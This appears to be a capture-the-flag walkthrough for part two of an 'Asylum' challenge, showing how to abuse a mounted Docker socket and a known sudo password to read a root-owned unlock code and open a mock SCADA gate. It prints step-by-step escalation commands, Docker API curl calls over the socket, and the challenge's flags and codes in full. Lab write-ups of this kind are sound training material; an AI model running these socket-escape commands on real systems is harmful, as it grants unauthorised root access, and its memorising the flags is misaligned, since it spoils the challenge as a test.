# Docker Escape Challenge: Asylum Gate Control - Complete Walkthrough

## Challenge Overview

This is **Part 2** of the Asylum challenge series. You've already gained initial access as `svc_vidops` user from Part 1 and retrieved the `user.txt` flag. Now you need to escape from a privileged Docker container to retrieve the numeric unlock code and unlock the asylum gate.

**Challenge Flow:**
1. **From Part 1:** You have shell access as `svc_vidops` user
2. Access the Docker container running the SCADA system
3. Perform Docker escape to retrieve the numeric unlock code
4. Unlock the gate using the SCADA terminal with the numeric code

## Challenge Information

- **Current User:** `svc_vidops` (from Part 1)
- **SCADA Terminal:** `nc localhost 9001` (or `<target-ip>:9001` if accessible externally)
- **SCADA Authentication:** Requires Part 1 flag: `THM{Y0u_h4ve_b3en_j3stered_739138}`
- **Container Name:** `asylum_gate_control`
- **Unlock Code Location:** `/root/.asylum/unlock_code` inside the container
- **Code Format:** Numeric authorization code (e.g., `739184627`)

---

## Step 1: Verify Your Access

### 1.1 Confirm You're Connected

You should already have shell access as `svc_vidops` from Part 1. Verify:

```bash
whoami
# Output: svc_vidops

pwd
# Should be in: /home/svc_vidops

cat user.txt
# Output: THM{Y0u_h4ve_b3en_j3stered_739138}
```

### 1.2 Explore the System

```bash
# Check current user permissions
id
# Output: uid=1000(svc_vidops) gid=1000(svc_vidops) groups=1000(svc_vidops)

# Check if Docker is available
docker --version

# List running containers
docker ps

# Look for the SCADA container
docker ps | grep asylum
# Should show: asylum_gate_control
```

---

## Step 2: Access the Docker Container

### 2.1 Direct Container Access

If you have Docker access, directly access the container:

```bash
docker exec -it asylum_gate_control /bin/bash
```

If that fails (permission denied), you might need to use sudo or check group membership.

### 2.2 Check Docker Group Membership

```bash
# Check if you're in docker group
groups

# If not in docker group, check if you can use sudo
sudo -l
```

### 2.3 Alternative: Check for Running Services

```bash
# Check what's listening on port 9001
netstat -tlnp | grep 9001
# or
ss -tlnp | grep 9001

# Try connecting to SCADA terminal directly
nc localhost 9001
```

---

## Step 3: Explore the Container

### 3.1 Container Environment

Once inside the container:

```bash
whoami
# Output: scada_operator

id
# Output: uid=1000(scada_operator) gid=1000(scada_operator) groups=1000(scada_operator),27(sudo),999(docker)

pwd
# Output: /opt/scada

ls -la
```

### 3.2 Check Available Tools

```bash
# Check if docker CLI is available
docker --version

# Check for Docker socket
ls -la /var/run/docker.sock

# Check sudo access
sudo -l
# Note: Password is gatekeeper123

# Check current capabilities
cat /proc/self/status | grep CapEff
```

### 3.3 Explore the SCADA System

```bash
# Check what's running
ps aux

# Look for SCADA terminal process
ps aux | grep scada

# Check network connections
netstat -tlnp
```

---

## Step 4: Docker Socket Escape

### 4.1 Understanding the Escape

The container has:
- **Docker socket mounted** at `/var/run/docker.sock`
- **Docker CLI installed**
- **Privileged container** with SYS_ADMIN capabilities
- **sudo access** (password: `gatekeeper123`)

We can use the Docker socket to execute commands as root inside the container, bypassing file permissions.

### 4.2 Get Container Identification

```bash
# Method 1: Get hostname (often container ID)
hostname

# Method 2: Get container ID from cgroup
cat /proc/self/cgroup | grep docker | head -1 | cut -d/ -f3

# Method 3: List containers via Docker socket
docker -H unix:///var/run/docker.sock ps

# Method 4: Get container name
docker -H unix:///var/run/docker.sock ps --format "{{.Names}}"
```

### 4.3 Execute Docker Socket Escape

**Method 1: Using sudo with Docker CLI (Recommended)**

```bash
sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/unlock_code
```

**Method 2: Using hostname**

```bash
sudo docker -H unix:///var/run/docker.sock exec -u root $(hostname) cat /root/.asylum/unlock_code
```

**Method 3: Dynamic container discovery**

```bash
CONTAINER_NAME=$(docker -H unix:///var/run/docker.sock ps --format "{{.Names}}" | grep asylum)
sudo docker -H unix:///var/run/docker.sock exec -u root $CONTAINER_NAME cat /root/.asylum/unlock_code
```

**Expected Output:**
```
739184627
```

**Why This Works:**
- The Docker socket at `/var/run/docker.sock` allows you to control containers
- Running as root user (`-u root`) bypasses file permissions
- You're executing inside the same container, but as root instead of `scada_operator`

---

## Step 5: Access the SCADA Terminal

### 5.1 Connect to SCADA Terminal

From your current shell (either from the host as `svc_vidops` or inside the container):

```bash
# If from host
nc localhost 9001

# If port is exposed externally (optional)
nc <target-ip> 9001
```

### 5.2 Authenticate with Part 1 Flag

The SCADA terminal requires authentication using the flag from Part 1. You'll see:

```
╔═══════════════════════════════════════════════════════════════╗
║     ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1          ║
║              [AUTHORIZED PERSONNEL ONLY]                      ║
╚═══════════════════════════════════════════════════════════════╝

[!] WARNING: This system controls critical infrastructure
[!] All access attempts are logged and monitored
[!] Unauthorized access will result in immediate termination

[!] Authentication required to access SCADA terminal
[!] Provide authorization token from Part 1 to proceed

[AUTH] Enter authorization token: 
```

**Enter the flag from Part 1:**
```
THM{Y0u_h4ve_b3en_j3stered_739138}
```

You'll see:
```
[✓] Authentication successful!

╔═══════════════════════════════════════════════════════════════╗
║     ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1          ║
║              [AUTHORIZED PERSONNEL ONLY]                      ║
╚═══════════════════════════════════════════════════════════════╝

[SCADA-ASYLUM-GATE] #LOCKED> 
```

### 5.3 Explore SCADA Commands

Try these commands to understand the system:

```
help
status
info
```

### 5.4 Unlock the Gate

Use the numeric code you retrieved to unlock the gate:

**Option 1: Direct numeric code submission**
```
unlock 739184627
```

**Option 2: File path (if accessible)**
```
unlock /root/.asylum/unlock_code
```

**Expected Output:**
```
╔══════════════════════════════════════════════════════════════╗
║                  GATE UNLOCK SUCCESSFUL                  ║
╚══════════════════════════════════════════════════════════════╝

[✓] Authorization code verified
[✓] Gate mechanism engaged
[✓] Final gate is now OPEN

Congratulations! You have successfully escaped the asylum!

UNLOCK CODE: 739184627
```

---

## Complete Solution Commands

Here's the complete solution flow:

```bash
# 1. You should already have shell as svc_vidops (from Part 1)

# 2. Access the Docker container
docker exec -it asylum_gate_control /bin/bash

# 3. Inside container, perform Docker escape to get unlock code
sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/unlock_code
# Output: 739184627

# 4. Access SCADA terminal and authenticate
nc localhost 9001
# Enter Part 1 flag: THM{Y0u_h4ve_b3en_j3stered_739138}
# Then unlock gate: unlock 739184627
```

---

## Alternative Methods

### Alternative 1: Using Sudo Password

If Docker socket access fails, use sudo with password:

```bash
# Inside container
sudo cat /root/.asylum/unlock_code
# Password: gatekeeper123
```

### Alternative 2: From Host Machine

If you have root access on the host:

```bash
# As root or with sudo on host
docker exec asylum_gate_control cat /root/.asylum/unlock_code
```

### Alternative 3: Using Docker API via curl

If docker CLI isn't working, use curl to interact with Docker socket:

```bash
# Get container ID
CONTAINER_ID=$(cat /proc/self/cgroup | grep docker | head -1 | cut -d/ -f3 | cut -c1-12)

# Create exec instance
EXEC_ID=$(curl -s -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout": true, "AttachStderr": true, "Cmd": ["cat", "/root/.asylum/unlock_code"], "User": "root"}' \
  http://localhost/containers/$CONTAINER_ID/exec | grep -o '"Id":"[^"]*' | cut -d'"' -f4)

# Execute and get output
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach": false, "Tty": false}' \
  http://localhost/exec/$EXEC_ID/start | tail -c +9
```

---

## Key Learning Points

1. **Docker Socket Escape:** When Docker socket is mounted inside a container, you can use it to control the Docker daemon and execute commands in containers with elevated privileges
2. **Privileged Containers:** Containers with `--privileged` flag have extensive kernel capabilities and access to host devices
3. **Container-to-Container Communication:** Using Docker socket, you can execute commands in the same container you're in, but with different user privileges
4. **SCADA Security:** Critical infrastructure control systems (SCADA) should never be containerized insecurely or run in privileged containers
5. **Defense in Depth:** Even if you escape a container, the final gate requires the correct authorization code

---

## Troubleshooting

### Can't access container with docker exec

```bash
# Check if you're in docker group
groups

# Try with sudo
sudo docker exec -it asylum_gate_control /bin/bash

# Check if container is running
docker ps | grep asylum
```

### Docker socket permission denied

```bash
# Check socket permissions
ls -la /var/run/docker.sock

# Try with sudo
sudo docker -H unix:///var/run/docker.sock ps

# Check if you're in docker group
id
```

### SCADA terminal won't connect

```bash
# Verify container is running
docker ps | grep asylum_gate_control

# Check if port is listening
netstat -tlnp | grep 9001

# Try from host
nc localhost 9001

# Check container logs
docker logs asylum_gate_control
```

### Can't read unlock code file

```bash
# Verify the path
ls -la /root/.asylum/unlock_code

# Check permissions
ls -la /root/.asylum/

# Use Docker socket escape method (bypasses permissions)
sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/unlock_code
```

---

## Challenge Connection

This challenge connects to **Part 1** where you:
- Gained RCE through the API/REPL broker
- Retrieved the `user.txt` flag as `svc_vidops`
- Flag: `THM{Y0u_h4ve_b3en_j3stered_739138}`

In **Part 2** (this challenge), you:
- Access the privileged Docker container
- Perform Docker escape to retrieve the numeric unlock code
- Unlock the final asylum gate

**Complete Flags:**
- **Part 1 (user.txt):** `THM{Y0u_h4ve_b3en_j3stered_739138}` - Required for SCADA authentication
- **Part 2 (unlock code):** `739184627` - Numeric code to unlock the gate

---

## Unlock Code

**Part 2 Unlock Code:** `739184627`

Congratulations on escaping the asylum!
